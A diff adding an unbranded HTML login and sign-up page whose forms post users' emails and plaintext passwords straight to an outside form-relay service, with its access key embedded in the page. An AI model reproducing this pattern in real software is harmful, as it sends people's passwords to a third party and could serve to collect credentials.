@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login & Sign-Up Page</title>
+    <style>
+        /* Global Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Container for Forms */
+        .form-container {
+            background-color: #fff;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+        }
+
+        /* Heading */
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        /* Input Fields */
+        input[type="text"], input[type="password"], input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        /* Button Styles */
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        /* Toggle Button for switching between Login and Sign-Up */
+        .toggle-btn {
+            background-color: transparent;
+            color: #333;
+            border: none;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 10px;
+        }
+
+        .toggle-btn:hover {
+            color: #4CAF50;
+        }
+
+        /* Success Message */
+        .success-message {
+            margin-top: 20px;
+            color: #4CAF50;
+            font-weight: bold;
+            display: none; /* Initially hidden */
+        }
+
+        /* Error Message */
+        .error-message {
+            margin-top: 20px;
+            color: red;
+            font-weight: bold;
+            display: none; /* Initially hidden */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container" id="form-container">
+        <h2 id="form-title">Login</h2>
+
+        <!-- Login Form -->
+        <form id="login-form" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="fcca97d8-4eb3-4f8f-a902-c6ed3b9d22df">
+            
+            <input type="email" name="email" id="login-email" placeholder="Email" required>
+            <input type="password" name="password" id="login-password" placeholder="Password" required>
+            
+            <button type="submit" class="btn">Login</button>
+            <button type="button" class="toggle-btn" onclick="toggleForm()">Create an account</button>
+        </form>
+
+        <!-- Sign-Up Form (Initially hidden) -->
+        <form id="signup-form" action="https://api.web3forms.com/submit" method="POST" style="display: none;">
+            <input type="hidden" name="access_key" value="fcca97d8-4eb3-4f8f-a902-c6ed3b9d22df">
+            
+            <input type="text" name="name" id="signup-name" placeholder="Full Name" required>
+            <input type="email" name="email" id="signup-email" placeholder="Email" required>
+            <input type="password" name="password" id="signup-password" placeholder="Password" required>
+            
+            <button type="submit" class="btn">Sign Up</button>
+            <button type="button" class="toggle-btn" onclick="toggleForm()">Already have an account? Login</button>
+        </form>
+
+        <!-- Success/Error Message -->
+        <p class="success-message" id="success-message">Form submitted successfully!</p>
+        <p class="error-message" id="error-message">Form submission failed. Please try again.</p>
+    </div>
+
+    <script>
+        // Function to toggle between Login and Sign-Up forms
+        function toggleForm() {
+            const loginForm = document.getElementById('login-form');
+            const signupForm = document.getElementById('signup-form');
+            const formTitle = document.getElementById('form-title');
+
+            if (loginForm.style.display === 'none') {
+                loginForm.style.display = 'block';
+                signupForm.style.display = 'none';
+                formTitle.innerText = 'Login';
+            } else {
+                loginForm.style.display = 'none';
+                signupForm.style.display = 'block';
+                formTitle.innerText = 'Sign Up';
+            }
+        }
+    </script>
+
+</body>
+</html>
